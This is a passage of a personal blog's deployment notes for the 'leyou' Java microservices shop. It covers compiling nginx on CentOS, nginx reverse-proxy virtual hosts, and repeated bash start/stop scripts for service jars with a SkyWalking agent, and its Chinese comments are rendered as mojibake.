<h2 id="å®‰è£…nginx-1"><a href="#å®‰è£…nginx-1" class="headerlink" title="å®‰è£…nginx"></a>å®‰è£…nginx</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">sudo yum -y install gcc gcc-c++ #å®‰è£…gccç¯å¢ƒ</span><br><span class="line">sudo yum -y install pcre pcre-devel # è®© nginx æ”¯æŒé‡å†™åŠŸèƒ½</span><br><span class="line"><span class="meta"># </span><span class="language-bash">zlib åº“æä¾›äº†å¾ˆå¤šå‹ç¼©å’Œè§£å‹ç¼©çš„æ–¹å¼ï¼Œnginx ä½¿ç”¨ zlib å¯¹ http åŒ…å†…å®¹è¿›è¡Œ gzip å‹ç¼©</span></span><br><span class="line">sudo yum -y install zlib zlib-devel </span><br><span class="line"><span class="meta"># </span><span class="language-bash">å®‰å…¨å¥—æ¥å­—å±‚å¯†ç åº“ï¼Œç”¨äºé€šä¿¡åŠ å¯†</span></span><br><span class="line">sudo yum -y install openssl openssl-devel</span><br><span class="line">wget http://nginx.org/download/nginx-1.20.1.tar.gz</span><br><span class="line">tar -zxvf nginx-1.20.1.tar.gz</span><br><span class="line"></span><br><span class="line">cd nginx-1.20.1/</span><br><span class="line"><span class="meta"># </span><span class="language-bash">--prefix=/usr/local/nginx  æ˜¯ nginx ç¼–è¯‘å®‰è£…çš„ç›®å½•ï¼ˆæ¨èï¼‰ï¼Œå®‰è£…å®Œåä¼šåœ¨æ­¤ç›®å½•ä¸‹ç”Ÿæˆç›¸å…³æ–‡ä»¶</span></span><br><span class="line">./configure --prefix=/usr/local/nginx # æ£€æŸ¥å¹³å°å®‰è£…ç¯å¢ƒ</span><br><span class="line"></span><br><span class="line">make # ç¼–è¯‘</span><br><span class="line">make install # å®‰è£…</span><br><span class="line"></span><br><span class="line">vi /usr/local/nginx/conf/nginx.conf </span><br><span class="line">å€’æ•°ç¬¬äºŒè¡ŒåŠ ä¸Š include vhost/*.conf;</span><br><span class="line"></span><br><span class="line">mkdir vhost</span><br><span class="line">vi leyou.conf</span><br><span class="line">server &#123;</span><br><span class="line">        listen   80;</span><br><span class="line">        server_name www.wl9939.top;</span><br><span class="line">        location / &#123;</span><br><span class="line">        root  /opt/leyou/leyou-portal;</span><br><span class="line">        &#125;</span><br><span class="line">        location /item &#123;</span><br><span class="line">            # æºå¸¦hostsåœ°å€ï¼Œé¿å…å› ä»£ç†å¯¼è‡´hostä¸¢å¤±</span><br><span class="line">            proxy_set_header Host       $host;</span><br><span class="line">						#openresty</span><br><span class="line">            proxy_pass   http://ly-resty;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  registry.wl9939.top;</span><br><span class="line">        location / &#123;</span><br><span class="line">                proxy_pass   http://ly-registry:10086;</span><br><span class="line">                proxy_connect_timeout 600;</span><br><span class="line">                proxy_read_timeout 5000;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  api.wl9939.top;</span><br><span class="line">        location / &#123;</span><br><span class="line">                proxy_pass   http://ly-gateway:10010;</span><br><span class="line">                proxy_connect_timeout 600;</span><br><span class="line">                proxy_read_timeout 5000;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  manage.wl9939.top;</span><br><span class="line">        location / &#123;</span><br><span class="line">                proxy_pass   http://127.0.0.1:9001;</span><br><span class="line">                proxy_connect_timeout 600;</span><br><span class="line">                proxy_read_timeout 5000;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">images</span></span><br><span class="line">scp /Users/huangmingwang/Downloads/images.zip root@mac-centos:/root</span><br><span class="line"><span class="meta">#</span><span class="language-bash">api</span></span><br><span class="line">scp /Users/huangmingwang/Downloads/nginx-1.12.2.zip root@mac-centos:/root</span><br><span class="line"></span><br><span class="line">unzip images.zip</span><br><span class="line">unzip nginx-1.12.2.zip</span><br><span class="line"></span><br><span class="line">cd /root/nginx-1.12.2/html/</span><br><span class="line">cp -r api/ /usr/local/nginx/html/</span><br><span class="line">cp -r images /usr/local/nginx/html/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/usr/local/nginx/sbin/nginx</span><br><span class="line">/usr/local/nginx/sbin/nginx -s reload</span><br><span class="line">/usr/local/nginx/sbin/nginx -s stop</span><br><span class="line">ps -ef | grep nginx # æŸ¥çœ‹æœåŠ¡è¿›ç¨‹</span><br><span class="line">netstat -anp|grep 9001 </span><br></pre></td></tr></table></figure>

<h2 id="å¿«ç…§ï¼šnginxï¼Œleyou-manageï¼Œleyou-portal"><a href="#å¿«ç…§ï¼šnginxï¼Œleyou-manageï¼Œleyou-portal" class="headerlink" title="å¿«ç…§ï¼šnginxï¼Œleyou-manageï¼Œleyou-portal"></a>å¿«ç…§ï¼šnginxï¼Œleyou-manageï¼Œleyou-portal</h2><h2 id="è¿è¡ŒjaråŒ…"><a href="#è¿è¡ŒjaråŒ…" class="headerlink" title="è¿è¡ŒjaråŒ…"></a>è¿è¡ŒjaråŒ…</h2><h3 id="Ly-gateway"><a href="#Ly-gateway" class="headerlink" title="Ly-gateway"></a>Ly-gateway</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">10086</span></span><br><span class="line">scp ly-registry-1.0-SNAPSHOT.jar root@mac-centos:/opt/leyou/</span><br><span class="line">scp application-product.yml root@mac-centos:/opt/leyou/config/application-ly-registry.yml</span><br><span class="line"></span><br><span class="line">cd /opt/leyou</span><br><span class="line">vi ly-registry.sh</span><br><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span> </span><br><span class="line"><span class="meta">#</span><span class="language-bash">è¿™é‡Œå¯æ›¿æ¢ä¸ºä½ è‡ªå·±çš„æ‰§è¡Œç¨‹åº,å…¶ä»–ä»£ç æ— éœ€æ›´æ”¹</span> </span><br><span class="line">APP_NAME=ly-registry-1.0-SNAPSHOT.jar </span><br><span class="line">JVM=&quot;-server -Xms128m -Xmx512m -XX:PermSize=64M -XX:MaxNewSize=128m -XX:MaxPermSize=128m -Djava.awt.headless=true -XX:+CMSClassUnloadingEnabled -XX:+CMSPermGenSweepingEnabled -javaagent:/opt/leyou/agent/skywalking-agent.jar -Dskywalking.agent.service_name=ly-registry -Dskywalking.collector.backend_service=81.68.97.129:11800&quot;</span><br><span class="line">APPFILE_PATH=&quot;-Dspring.config.location=/opt/leyou/config/application-ly-registry.yml&quot;</span><br><span class="line"><span class="meta">#</span><span class="language-bash">ä½¿ç”¨è¯´æ˜,ç”¨æ¥æç¤ºè¾“å…¥å‚æ•°</span> </span><br><span class="line">usage() &#123; </span><br><span class="line">echo &quot;Usage: sh æ‰§è¡Œè„šæœ¬.sh [start|stop|restart|status]&quot; </span><br><span class="line">exit 1 </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ£€æŸ¥ç¨‹åºæ˜¯å¦åœ¨è¿è¡Œ</span> </span><br><span class="line">is_exist()&#123; </span><br><span class="line">pid=`ps -ef|grep $APP_NAME|grep -v grep|awk &#x27;&#123;print $2&#125;&#x27; ` </span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¦‚æœä¸å­˜åœ¨è¿”å›1,å­˜åœ¨è¿”å›0</span> </span><br><span class="line">if [ -z &quot;$&#123;pid&#125;&quot; ]; then </span><br><span class="line">return 1 </span><br><span class="line">else </span><br><span class="line">return 0 </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¯åŠ¨æ–¹æ³•</span> </span><br><span class="line">start()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is already running. pid=$&#123;pid&#125; .&quot; </span><br><span class="line">else </span><br><span class="line">nohup java $JVM -jar $APPFILE_PATH $APP_NAME &amp;</span><br><span class="line">fi</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">åœæ­¢æ–¹æ³•</span> </span><br><span class="line">stop()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">kill -9 $pid </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is not running&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">è¾“å‡ºè¿è¡ŒçŠ¶æ€</span> </span><br><span class="line">status()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is running. Pid is $&#123;pid&#125;&quot; </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is NOT running.&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">é‡å¯</span> </span><br><span class="line">restart()&#123; </span><br><span class="line">stop </span><br><span class="line">start </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ ¹æ®è¾“å…¥å‚æ•°,é€‰æ‹©æ‰§è¡Œå¯¹åº”æ–¹æ³•,ä¸è¾“å…¥åˆ™æ‰§è¡Œä½¿ç”¨è¯´æ˜</span> </span><br><span class="line">case &quot;$1&quot; in </span><br><span class="line">&quot;start&quot;) </span><br><span class="line">start </span><br><span class="line">;; </span><br><span class="line">&quot;stop&quot;) </span><br><span class="line">stop </span><br><span class="line">;; </span><br><span class="line">&quot;status&quot;) </span><br><span class="line">status </span><br><span class="line">;; </span><br><span class="line">&quot;restart&quot;) </span><br><span class="line">restart </span><br><span class="line">;; </span><br><span class="line">*) </span><br><span class="line">usage </span><br><span class="line">;; </span><br><span class="line">esac</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">10010</span></span><br><span class="line">scp ly-gateway-1.0-SNAPSHOT.jar root@mac-centos:/opt/leyou/</span><br><span class="line">cd /opt/leyou</span><br><span class="line">vi ly-gateway-start.sh</span><br><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">RESOURCE_NAME=ly-gateway-1.0-SNAPSHOT.jar</span><br><span class="line"> </span><br><span class="line">tpid=`ps -ef|grep $RESOURCE_NAME|grep -v grep|grep -v kill|awk &#x27;&#123;print $2&#125;&#x27;`</span><br><span class="line">if [ $&#123;tpid&#125; ]; then</span><br><span class="line">echo &#x27;Stop Process...&#x27;</span><br><span class="line">kill -15 $tpid</span><br><span class="line">fi</span><br><span class="line">sleep 5</span><br><span class="line">tpid=`ps -ef|grep $RESOURCE_NAME|grep -v grep|grep -v kill|awk &#x27;&#123;print $2&#125;&#x27;`</span><br><span class="line">if [ $&#123;tpid&#125; ]; then</span><br><span class="line">echo &#x27;Kill Process!&#x27;</span><br><span class="line">kill -9 $tpid</span><br><span class="line">else</span><br><span class="line">echo &#x27;Stop Success!&#x27;</span><br><span class="line">fi</span><br><span class="line"> </span><br><span class="line">tpid=`ps -ef|grep $RESOURCE_NAME|grep -v grep|grep -v kill|awk &#x27;&#123;print $2&#125;&#x27;`</span><br><span class="line">if [ $&#123;tpid&#125; ]; then</span><br><span class="line">    echo &#x27;App is running.&#x27;</span><br><span class="line">else</span><br><span class="line">    echo &#x27;App is NOT running.&#x27;</span><br><span class="line">fi</span><br><span class="line"> </span><br><span class="line">rm -f tpid</span><br><span class="line">nohup java -javaagent:/opt/leyou/agent/skywalking-agent.jar -Dskywalking.agent.service_name=ly-gateway -Dskywalking.collector.backend_service=81.68.97.129:11800 -jar ./$RESOURCE_NAME --spring.profiles.active=product &amp;</span><br><span class="line">echo $! &gt; tpid</span><br></pre></td></tr></table></figure>

<h3 id="Ly-gateway-1"><a href="#Ly-gateway-1" class="headerlink" title="Ly-gateway"></a>Ly-gateway</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">10010</span></span><br><span class="line">scp ly-gateway-1.0-SNAPSHOT.jar root@mac-centos:/opt/leyou/</span><br><span class="line">scp application-product.yml root@mac-centos:/opt/leyou/config/application-ly-gateway.yml</span><br><span class="line"></span><br><span class="line">cd /opt/leyou</span><br><span class="line">vi ly-gateway.sh</span><br><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span> </span><br><span class="line"><span class="meta">#</span><span class="language-bash">è¿™é‡Œå¯æ›¿æ¢ä¸ºä½ è‡ªå·±çš„æ‰§è¡Œç¨‹åº,å…¶ä»–ä»£ç æ— éœ€æ›´æ”¹</span> </span><br><span class="line">APP_NAME=ly-gateway-1.0-SNAPSHOT.jar </span><br><span class="line">JVM=&quot;-server -Xms128m -Xmx512m -XX:PermSize=64M -XX:MaxNewSize=128m -XX:MaxPermSize=128m -Djava.awt.headless=true -XX:+CMSClassUnloadingEnabled -XX:+CMSPermGenSweepingEnabled -javaagent:/opt/leyou/agent/skywalking-agent.jar -Dskywalking.agent.service_name=ly-gateway -Dskywalking.collector.backend_service=81.68.97.129:11800&quot;</span><br><span class="line">APPFILE_PATH=&quot;-Dspring.config.location=/opt/leyou/config/application-ly-gateway.yml&quot;</span><br><span class="line"><span class="meta">#</span><span class="language-bash">ä½¿ç”¨è¯´æ˜,ç”¨æ¥æç¤ºè¾“å…¥å‚æ•°</span> </span><br><span class="line">usage() &#123; </span><br><span class="line">echo &quot;Usage: sh æ‰§è¡Œè„šæœ¬.sh [start|stop|restart|status]&quot; </span><br><span class="line">exit 1 </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ£€æŸ¥ç¨‹åºæ˜¯å¦åœ¨è¿è¡Œ</span> </span><br><span class="line">is_exist()&#123; </span><br><span class="line">pid=`ps -ef|grep $APP_NAME|grep -v grep|awk &#x27;&#123;print $2&#125;&#x27; ` </span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¦‚æœä¸å­˜åœ¨è¿”å›1,å­˜åœ¨è¿”å›0</span> </span><br><span class="line">if [ -z &quot;$&#123;pid&#125;&quot; ]; then </span><br><span class="line">return 1 </span><br><span class="line">else </span><br><span class="line">return 0 </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¯åŠ¨æ–¹æ³•</span> </span><br><span class="line">start()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is already running. pid=$&#123;pid&#125; .&quot; </span><br><span class="line">else </span><br><span class="line">nohup java $JVM -jar $APPFILE_PATH $APP_NAME &amp;</span><br><span class="line">fi</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">åœæ­¢æ–¹æ³•</span> </span><br><span class="line">stop()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">kill -9 $pid </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is not running&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">è¾“å‡ºè¿è¡ŒçŠ¶æ€</span> </span><br><span class="line">status()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is running. Pid is $&#123;pid&#125;&quot; </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is NOT running.&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">é‡å¯</span> </span><br><span class="line">restart()&#123; </span><br><span class="line">stop </span><br><span class="line">start </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ ¹æ®è¾“å…¥å‚æ•°,é€‰æ‹©æ‰§è¡Œå¯¹åº”æ–¹æ³•,ä¸è¾“å…¥åˆ™æ‰§è¡Œä½¿ç”¨è¯´æ˜</span> </span><br><span class="line">case &quot;$1&quot; in </span><br><span class="line">&quot;start&quot;) </span><br><span class="line">start </span><br><span class="line">;; </span><br><span class="line">&quot;stop&quot;) </span><br><span class="line">stop </span><br><span class="line">;; </span><br><span class="line">&quot;status&quot;) </span><br><span class="line">status </span><br><span class="line">;; </span><br><span class="line">&quot;restart&quot;) </span><br><span class="line">restart </span><br><span class="line">;; </span><br><span class="line">*) </span><br><span class="line">usage </span><br><span class="line">;; </span><br><span class="line">esac</span><br></pre></td></tr></table></figure>



<h3 id="Ly-auth-service"><a href="#Ly-auth-service" class="headerlink" title="Ly-auth-service"></a>Ly-auth-service</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">10010</span></span><br><span class="line">scp ly-auth-service-1.0-SNAPSHOT.jar root@mac-centos:/opt/leyou/</span><br><span class="line">scp application-product.yml root@mac-centos:/opt/leyou/config/application-ly-auth-service.yml</span><br><span class="line"></span><br><span class="line">cd /opt/leyou</span><br><span class="line">vi ly-auth-service.sh</span><br><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span> </span><br><span class="line"><span class="meta">#</span><span class="language-bash">è¿™é‡Œå¯æ›¿æ¢ä¸ºä½ è‡ªå·±çš„æ‰§è¡Œç¨‹åº,å…¶ä»–ä»£ç æ— éœ€æ›´æ”¹</span> </span><br><span class="line">APP_NAME=ly-auth-service-1.0-SNAPSHOT.jar </span><br><span class="line">JVM=&quot;-server -Xms128m -Xmx512m -XX:PermSize=64M -XX:MaxNewSize=128m -XX:MaxPermSize=128m -Djava.awt.headless=true -XX:+CMSClassUnloadingEnabled -XX:+CMSPermGenSweepingEnabled -javaagent:/opt/leyou/agent/skywalking-agent.jar -Dskywalking.agent.service_name=ly-auth-service -Dskywalking.collector.backend_service=81.68.97.129:11800&quot;</span><br><span class="line">APPFILE_PATH=&quot;-Dspring.config.location=/opt/leyou/config/application-ly-auth-service.yml&quot;</span><br><span class="line"><span class="meta">#</span><span class="language-bash">ä½¿ç”¨è¯´æ˜,ç”¨æ¥æç¤ºè¾“å…¥å‚æ•°</span> </span><br><span class="line">usage() &#123; </span><br><span class="line">echo &quot;Usage: sh æ‰§è¡Œè„šæœ¬.sh [start|stop|restart|status]&quot; </span><br><span class="line">exit 1 </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ£€æŸ¥ç¨‹åºæ˜¯å¦åœ¨è¿è¡Œ</span> </span><br><span class="line">is_exist()&#123; </span><br><span class="line">pid=`ps -ef|grep $APP_NAME|grep -v grep|awk &#x27;&#123;print $2&#125;&#x27; ` </span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¦‚æœä¸å­˜åœ¨è¿”å›1,å­˜åœ¨è¿”å›0</span> </span><br><span class="line">if [ -z &quot;$&#123;pid&#125;&quot; ]; then </span><br><span class="line">return 1 </span><br><span class="line">else </span><br><span class="line">return 0 </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¯åŠ¨æ–¹æ³•</span> </span><br><span class="line">start()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is already running. pid=$&#123;pid&#125; .&quot; </span><br><span class="line">else </span><br><span class="line">nohup java $JVM -jar $APPFILE_PATH $APP_NAME &amp;</span><br><span class="line">fi</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">åœæ­¢æ–¹æ³•</span> </span><br><span class="line">stop()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">kill -9 $pid </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is not running&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">è¾“å‡ºè¿è¡ŒçŠ¶æ€</span> </span><br><span class="line">status()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is running. Pid is $&#123;pid&#125;&quot; </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is NOT running.&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">é‡å¯</span> </span><br><span class="line">restart()&#123; </span><br><span class="line">stop </span><br><span class="line">start </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ ¹æ®è¾“å…¥å‚æ•°,é€‰æ‹©æ‰§è¡Œå¯¹åº”æ–¹æ³•,ä¸è¾“å…¥åˆ™æ‰§è¡Œä½¿ç”¨è¯´æ˜</span> </span><br><span class="line">case &quot;$1&quot; in </span><br><span class="line">&quot;start&quot;) </span><br><span class="line">start </span><br><span class="line">;; </span><br><span class="line">&quot;stop&quot;) </span><br><span class="line">stop </span><br><span class="line">;; </span><br><span class="line">&quot;status&quot;) </span><br><span class="line">status </span><br><span class="line">;; </span><br><span class="line">&quot;restart&quot;) </span><br><span class="line">restart </span><br><span class="line">;; </span><br><span class="line">*) </span><br><span class="line">usage </span><br><span class="line">;; </span><br><span class="line">esac</span><br></pre></td></tr></table></figure>

<h3 id="Ly-item-service"><a href="#Ly-item-service" class="headerlink" title="Ly-item-service"></a>Ly-item-service</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">10010</span></span><br><span class="line">scp ly-item-service-1.0-SNAPSHOT.jar root@mac-centos:/opt/leyou/</span><br><span class="line">scp application-product.yml root@mac-centos:/opt/leyou/config/application-ly-item-service.yml</span><br><span class="line"></span><br><span class="line">cd /opt/leyou</span><br><span class="line">vi ly-item-service.sh</span><br><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span> </span><br><span class="line"><span class="meta">#</span><span class="language-bash">è¿™é‡Œå¯æ›¿æ¢ä¸ºä½ è‡ªå·±çš„æ‰§è¡Œç¨‹åº,å…¶ä»–ä»£ç æ— éœ€æ›´æ”¹</span> </span><br><span class="line">APP_NAME=ly-item-service-1.0-SNAPSHOT.jar </span><br><span class="line">JVM=&quot;-server -Xms512m -Xmx512m -XX:PermSize=64M -XX:MaxNewSize=128m -XX:MaxPermSize=128m -Djava.awt.headless=true -XX:+CMSClassUnloadingEnabled -XX:+CMSPermGenSweepingEnabled -javaagent:/opt/leyou/agent/skywalking-agent.jar -Dskywalking.agent.service_name=ly-item-service -Dskywalking.collector.backend_service=81.68.97.129:11800&quot;</span><br><span class="line">APPFILE_PATH=&quot;-Dspring.config.location=/opt/leyou/config/application-ly-item-service.yml&quot;</span><br><span class="line"><span class="meta">#</span><span class="language-bash">ä½¿ç”¨è¯´æ˜,ç”¨æ¥æç¤ºè¾“å…¥å‚æ•°</span> </span><br><span class="line">usage() &#123; </span><br><span class="line">echo &quot;Usage: sh æ‰§è¡Œè„šæœ¬.sh [start|stop|restart|status]&quot; </span><br><span class="line">exit 1 </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ£€æŸ¥ç¨‹åºæ˜¯å¦åœ¨è¿è¡Œ</span> </span><br><span class="line">is_exist()&#123; </span><br><span class="line">pid=`ps -ef|grep $APP_NAME|grep -v grep|awk &#x27;&#123;print $2&#125;&#x27; ` </span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¦‚æœä¸å­˜åœ¨è¿”å›1,å­˜åœ¨è¿”å›0</span> </span><br><span class="line">if [ -z &quot;$&#123;pid&#125;&quot; ]; then </span><br><span class="line">return 1 </span><br><span class="line">else </span><br><span class="line">return 0 </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¯åŠ¨æ–¹æ³•</span> </span><br><span class="line">start()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is already running. pid=$&#123;pid&#125; .&quot; </span><br><span class="line">else </span><br><span class="line">nohup java $JVM -jar $APPFILE_PATH $APP_NAME &amp;</span><br><span class="line">fi</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">åœæ­¢æ–¹æ³•</span> </span><br><span class="line">stop()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">kill -9 $pid </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is not running&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">è¾“å‡ºè¿è¡ŒçŠ¶æ€</span> </span><br><span class="line">status()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is running. Pid is $&#123;pid&#125;&quot; </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is NOT running.&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">é‡å¯</span> </span><br><span class="line">restart()&#123; </span><br><span class="line">stop </span><br><span class="line">start </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ ¹æ®è¾“å…¥å‚æ•°,é€‰æ‹©æ‰§è¡Œå¯¹åº”æ–¹æ³•,ä¸è¾“å…¥åˆ™æ‰§è¡Œä½¿ç”¨è¯´æ˜</span> </span><br><span class="line">case &quot;$1&quot; in </span><br><span class="line">&quot;start&quot;) </span><br><span class="line">start </span><br><span class="line">;; </span><br><span class="line">&quot;stop&quot;) </span><br><span class="line">stop </span><br><span class="line">;; </span><br><span class="line">&quot;status&quot;) </span><br><span class="line">status </span><br><span class="line">;; </span><br><span class="line">&quot;restart&quot;) </span><br><span class="line">restart </span><br><span class="line">;; </span><br><span class="line">*) </span><br><span class="line">usage </span><br><span class="line">;; </span><br><span class="line">esac</span><br></pre></td></tr></table></figure>

<h3 id="Ly-page"><a href="#Ly-page" class="headerlink" title="Ly-page"></a>Ly-page</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">10010</span></span><br><span class="line">scp ly-page-1.0-SNAPSHOT.jar root@mac-centos:/opt/leyou/</span><br><span class="line">scp application-product.yml root@mac-centos:/opt/leyou/config/application-ly-page.yml</span><br><span class="line"></span><br><span class="line">cd /opt/leyou</span><br><span class="line">vi ly-page.sh</span><br><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span> </span><br><span class="line"><span class="meta">#</span><span class="language-bash">è¿™é‡Œå¯æ›¿æ¢ä¸ºä½ è‡ªå·±çš„æ‰§è¡Œç¨‹åº,å…¶ä»–ä»£ç æ— éœ€æ›´æ”¹</span> </span><br><span class="line">APP_NAME=ly-page-1.0-SNAPSHOT.jar </span><br><span class="line">JVM=&quot;-server -Xms512m -Xmx512m -XX:PermSize=64M -XX:MaxNewSize=128m -XX:MaxPermSize=128m -Djava.awt.headless=true -XX:+CMSClassUnloadingEnabled -XX:+CMSPermGenSweepingEnabled -javaagent:/opt/leyou/agent/skywalking-agent.jar -Dskywalking.agent.service_name=ly-page -Dskywalking.collector.backend_service=81.68.97.129:11800&quot;</span><br><span class="line">APPFILE_PATH=&quot;-Dspring.config.location=/opt/leyou/config/application-ly-page.yml&quot;</span><br><span class="line"><span class="meta">#</span><span class="language-bash">ä½¿ç”¨è¯´æ˜,ç”¨æ¥æç¤ºè¾“å…¥å‚æ•°</span> </span><br><span class="line">usage() &#123; </span><br><span class="line">echo &quot;Usage: sh æ‰§è¡Œè„šæœ¬.sh [start|stop|restart|status]&quot; </span><br><span class="line">exit 1 </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ£€æŸ¥ç¨‹åºæ˜¯å¦åœ¨è¿è¡Œ</span> </span><br><span class="line">is_exist()&#123; </span><br><span class="line">pid=`ps -ef|grep $APP_NAME|grep -v grep|awk &#x27;&#123;print $2&#125;&#x27; ` </span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¦‚æœä¸å­˜åœ¨è¿”å›1,å­˜åœ¨è¿”å›0</span> </span><br><span class="line">if [ -z &quot;$&#123;pid&#125;&quot; ]; then </span><br><span class="line">return 1 </span><br><span class="line">else </span><br><span class="line">return 0 </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¯åŠ¨æ–¹æ³•</span> </span><br><span class="line">start()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is already running. pid=$&#123;pid&#125; .&quot; </span><br><span class="line">else </span><br><span class="line">nohup java $JVM -jar $APPFILE_PATH $APP_NAME &amp;</span><br><span class="line">fi</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">åœæ­¢æ–¹æ³•</span> </span><br><span class="line">stop()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">kill -9 $pid </span><br><span class="line">else </span><br><span class="line">echo 